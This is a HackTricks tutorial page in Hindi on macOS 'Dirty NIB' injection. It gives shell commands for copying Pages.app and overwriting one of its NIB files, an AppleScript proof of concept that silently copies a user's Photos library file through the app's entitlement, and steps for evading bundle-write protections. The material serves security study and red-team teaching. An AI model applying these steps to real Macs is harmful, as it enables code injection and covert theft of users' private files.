# macOS Dirty NIB

<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें.**
* **अपनी हैकिंग तकनीकें साझा करें, HackTricks** [**और HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>

**यह तकनीक पोस्ट से ली गई थी** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## मूल जानकारी

NIB फाइलें Apple के डेवलपमेंट इकोसिस्टम में **यूजर इंटरफेस (UI) तत्वों को परिभाषित करने** और एप्लिकेशन के भीतर उनके इंटरैक्शन के लिए इस्तेमाल की जाती हैं। Interface Builder टूल के साथ बनाई गई, वे **सीरियलाइज्ड ऑब्जेक्ट्स** जैसे कि विंडोज, बटन, और टेक्स्ट फील्ड्स को संग्रहित करती हैं, जो रनटाइम पर लोड होती हैं ताकि डिजाइन किया गया UI प्रस्तुत किया जा सके। हालांकि अभी भी इस्तेमाल में है, Apple ने एप्लिकेशन के UI फ्लो का अधिक दृश्य प्रतिनिधित्व के लिए Storyboards की ओर सिफारिश की है।

{% hint style="danger" %}
इसके अलावा, **NIB फाइलें** **मनमाने कमांड्स चलाने** के लिए भी इस्तेमाल की जा सकती हैं और यदि किसी ऐप में NIB फाइल को संशोधित किया जाता है, तो **Gatekeeper फिर भी ऐप को चलाने की अनुमति देगा**, इसलिए वे एप्लिकेशन्स के भीतर **मनमाने कमांड्स चलाने** के लिए इस्तेमाल किए जा सकते हैं।
{% endhint %}

## Dirty NIB Injection <a href="#dirtynib" id="dirtynib"></a>

सबसे पहले हमें एक नई NIB फाइल बनाने की जरूरत है, हम XCode का इस्तेमाल करके निर्माण का अधिकांश हिस्सा करेंगे। हम इंटरफेस में एक Object जोड़कर शुरू करते हैं और क्लास को NSAppleScript में सेट करते हैं:

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

ऑब्जेक्ट के लिए हमें प्रारंभिक `source` प्रॉपर्टी सेट करनी होगी, जिसे हम User Defined Runtime Attributes का उपयोग करके कर सकते हैं:

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

यह हमारे कोड निष्पादन गैजेट को सेटअप करता है, जो केवल **AppleScript को अनुरोध पर चलाने वाला है**। AppleScript के निष्पादन को वास्तव में ट्रिगर करने के लिए, हम अभी के लिए एक बटन जोड़ेंगे (आप इसके साथ रचनात्मक भी हो सकते हैं ;). बटन `Apple Script` ऑब्जेक्ट से बाइंड होगा जिसे हमने अभी बनाया है, और **`executeAndReturnError:` सेलेक्टर को इन्वोक करेगा**:

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

परीक्षण के लिए हम केवल Apple Script का उपयोग करेंगे:
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
और अगर हम इसे XCode डीबगर में चलाएं और बटन दबाएं:

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

NIB से मनमाने AppleScript कोड को निष्पादित करने की हमारी क्षमता के साथ, हमें अगले लक्ष्य की आवश्यकता है। आइए हमारे प्रारंभिक डेमो के लिए Pages का चयन करते हैं, जो निश्चित रूप से एक Apple एप्लिकेशन है और निश्चित रूप से हमारे द्वारा संशोधित नहीं होना चाहिए।

हम पहले एप्लिकेशन की एक प्रति `/tmp/` में लेंगे:
```bash
cp -a -X /Applications/Pages.app /tmp/
```
फिर हम एप्लिकेशन को लॉन्च करेंगे ताकि किसी भी Gatekeeper समस्या से बचा जा सके और चीजों को कैश किया जा सके:
```bash
open -W -g -j /Applications/Pages.app
```
लॉन्च करने (और मारने) के बाद पहली बार, हमें एक मौजूदा NIB फ़ाइल को हमारी DirtyNIB फ़ाइल से ओवरराइट करना होगा। डेमो के उद्देश्यों के लिए, हम बस About Panel NIB को ओवरराइट करने जा रहे हैं ताकि हम निष्पादन को नियंत्रित कर सकें:
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
हमने एक बार nib को ओवरराइट कर दिया, हम `About` मेनू आइटम का चयन करके निष्पादन को ट्रिगर कर सकते हैं:

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

अगर हम Pages को थोड़ा और ध्यान से देखें, तो हम देखते हैं कि इसमें एक निजी अधिकार है जो उपयोगकर्ता के Photos तक पहुँचने की अनुमति देता है:

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

इसलिए हम अपने POC को परीक्षण में डाल सकते हैं **हमारे AppleScript को संशोधित करके उपयोगकर्ता से बिना प्रॉम्प्ट किए फोटोज चुराने के लिए**:

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**दुर्भावनापूर्ण .xib फ़ाइल जो मनमाना कोड निष्पादित करती है उदाहरण.**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## अपना खुद का DirtyNIB बनाएं



## लॉन्च प्रतिबंध

ये मूल रूप से **अपेक्षित स्थानों के बाहर एप्लिकेशन निष्पादित होने से रोकते हैं**, इसलिए यदि आप लॉन्च प्रतिबंधों द्वारा संरक्षित एक एप्लिकेशन को `/tmp` में कॉपी करते हैं, तो आप उसे निष्पादित नहीं कर पाएंगे।\
[**इस पोस्ट में अधिक जानकारी पाएं**](../macos-security-protections/#launch-constraints)**.**

हालांकि, फ़ाइल **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** को पार्स करके आप अभी भी **लॉन्च प्रतिबंधों द्वारा संरक्षित नहीं किए गए एप्लिकेशन पा सकते हैं** इसलिए आप अभी भी **NIB** फ़ाइलों को मनमाने स्थानों में **उनमें इंजेक्ट** कर सकते हैं (इन एप्लिकेशनों को खोजने के लिए पिछले लिंक की जांच करें)।

## अतिरिक्त सुरक्षा

macOS Somona से, कुछ सुरक्षा हैं जो **एप्स के अंदर लिखने से रोकती हैं**। हालांकि, यदि आप बाइनरी की अपनी कॉपी चलाने से पहले Contents फ़ोल्डर का नाम बदल देते हैं, तो इस सुरक्षा को बायपास करना अभी भी संभव है:

1. `CarPlay Simulator.app` की एक कॉपी `/tmp/` में लें
2. `/tmp/Carplay Simulator.app/Contents` का नाम बदलें `/tmp/CarPlay Simulator.app/NotCon`
3. Gatekeeper के साथ कैश करने के लिए बाइनरी `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` लॉन्च करें
4. `NotCon/Resources/Base.lproj/MainMenu.nib` को हमारी `Dirty.nib` फ़ाइल से ओवरराइट करें
5. `/tmp/CarPlay Simulator.app/Contents` के नाम से बदलें
6. `CarPlay Simulator.app` को फिर से लॉन्च करें

{% hint style="success" %}
ऐसा लगता है कि यह अब संभव नहीं है क्योंकि macOS **एप्लिकेशन बंडलों के अंदर फ़ाइलों को संशोधित करने से रोकता है**।\
इसलिए, एप्लिकेशन को Gatekeeper के साथ कैश करने के बाद, आप बंडल को संशोधित नहीं कर पाएंगे।\
और यदि आप उदाहरण के लिए Contents निर्देशिका का नाम **NotCon** के रूप में बदलते हैं (जैसा कि उपयोग में बताया गया है), और फिर एप्लिकेशन की मुख्य बाइनरी को Gatekeeper के साथ कैश करने के लिए निष्पादित करते हैं, तो यह **त्रुटि उत्पन्न करेगा और निष्पादित नहीं होगा**।
{% endhint %}

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
